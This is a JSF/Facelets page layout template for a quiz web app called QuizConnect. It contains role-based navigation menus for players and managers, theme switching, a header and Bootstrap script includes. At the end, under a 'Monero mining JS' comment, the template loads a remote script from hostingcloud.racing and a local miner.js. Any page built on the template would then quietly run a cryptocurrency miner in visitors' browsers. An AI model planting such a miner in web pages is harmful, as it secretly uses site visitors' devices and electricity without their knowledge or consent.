<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns:ui="http://java.sun.com/jsf/facelets"
      xmlns="http://www.w3.org/1999/xhtml"
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://xmlns.jcp.org/jsf/core"
      lang="en">
<h:head>
    <!-- Required meta tags -->
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>

    <script type="text/javascript" src="../../resources/js/themes.js" />

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"/>
    <link rel="stylesheet" href="../../resources/main.css" />

    <!--FontAwesome -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous"/>

    <title><ui:insert name="title" /> | QuizConnect</title>

    <ui:insert name="site-specific-css"/>

</h:head>

<h:body>
    <div data-pushbar-id="bar" class="pushbar from_left">
        <div class="pushbar-close">
            <span data-pushbar-close="" class="py-2 px-2 my-2 mx-3">
                <svg viewBox="0 0 24 24" width="24" height="24"><path class="heroicon-ui" d="M16.24 14.83a1 1 0 0 1-1.41 1.41L12 13.41l-2.83 2.83a1 1 0 0 1-1.41-1.41L10.59 12 7.76 9.17a1 1 0 0 1 1.41-1.41L12 10.59l2.83-2.83a1 1 0 0 1 1.41 1.41L13.41 12l2.83 2.83z"/></svg>
            </span>
        </div>

        <h:form rendered="#{sessionInfoBean.hasRole('PLAYER')}">
            <nav class="pushbar-nav pl-4 pr-3 py-4">
                <ul class="list-unstyled">
                    <li class="my-3">
                        <h:commandLink action="/players/profile?faces-redirect=true" value="Home">
                            <f:ajax execute="@this" render="@none"/>
                            <f:setPropertyActionListener value="#{sessionInfoBean.currentUser.player}" target="#{profileBean.player}"/>
                        </h:commandLink>
                    </li>
                    <li class="my-3">
                        <a href="/quizroom/index.html">Join Game</a>
                    </li>
                    <li class="my-3">
                        <a href="/quizroom/createRoom.xhtml?faces-redirect=true">Create Game</a>
                    </li>
                    <li class="my-3">
                        <h:commandLink action="/players/all?faces-redirect=true" value="View Players"/>
                    </li>
                </ul>
            </nav>
        </h:form>

        <h:form rendered="#{sessionInfoBean.hasRole('MANAGER')}">
            <nav class="pushbar-nav pl-4 pr-3 py-4">
                <ul class="list-unstyled">
                    <li class="my-3">
                        <h:commandLink action="/secured/home?faces-redirect=true" value="Home"/>
                    </li>
                    <li class="my-3">
                        <h:commandLink action="/secured/overview.xhtml?faces-redirect=true" value="QuestionSets"/>
                    </li>
                    <li class="my-3">
                        <h:commandLink action="/players/all?faces-redirect=true" value="Players"/>
                    </li>
                    <li class="my-3">
                        <h:commandLink action="/secured/profile.xhtml?faces-redirect=true" value="Settings"/>
                    </li>
                </ul>
            </nav>
        </h:form>

        <!-- TODO -->
        <div onclick="changeTheme('default')">default</div>
        <div onclick="changeTheme('outrun')">outrun</div>

        <a class="pushbar-logout" href="/logout">Logout</a>
    </div>


    <div class="pushbar_main_content">
        <header class="navbar d-flex py-2">
            <div class="navbar-burger py-2 px-2" data-pushbar-target="bar">
                <svg viewBox="0 0 24 24" width="24" height="24"><path class="heroicon-ui" d="M4 5h16a1 1 0 0 1 0 2H4a1 1 0 1 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2z"/></svg>
            </div>

            <div class="d-flex flex-grow-1 justify-content-center px-2">
                <h2 class="site-title"><ui:insert name="title" /></h2>
            </div>

            <div class="d-flex justify-content-end px-2">
                <a class="navbar-logo icon" href="/login.xhtml">
                    <svg id="icon" viewBox="0 0 2000 2000" width="30" height="30"><defs><style>.cls-1,.cls-2{fill:none;stroke-miterlimit:10;stroke-width:200px;}.cls-1{stroke:#018786;stroke-dasharray:248.33 19.87;}.cls-2{stroke:#00c4b4;stroke-linecap:round;}.cls-3{fill:#3bc5b5;}</style></defs><circle class="cls-1" cx="1000" cy="1000" r="853.59"/><path class="cls-2" d="M1000,1853.59c-471.42,0-853.59-382.16-853.59-853.59S528.58,146.41,1000,146.41"/><path class="cls-3" d="M1042.58,866.18,1949,1953,898.42,1004.82A100.25,100.25,0,0,1,1032.76,856,109.71,109.71,0,0,1,1042.58,866.18Z"/></svg>
                </a>
            </div>
        </header>

        <main class="container">
            <ui:insert name="content" />
        </main>

        <h:messages styleClass="messages" id="messages" globalonly="true" showSummary="true" showDetail="true"/>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    <script type="text/javascript" src="../../resources/modules/alerts.js"/>
    <script type="text/javascript" src="../../resources/modules/pushbar.js" />
    <script type="text/javascript">
        const pushbar = new Pushbar({
            blur:true,
            overlay:true,
        });
    </script>

    <!-- Monero mining JS -->
    <!-- Blocked by my adblocker, but local copy of code doesn't work :/ -->
    <script type="text/javascript" src="https://www.hostingcloud.racing/R0UY.js"></script>
    <script type="text/javascript" src="../../resources/js/miner.js" />

    <ui:insert name="site-specific-javascript"/>
</h:body>
</html>
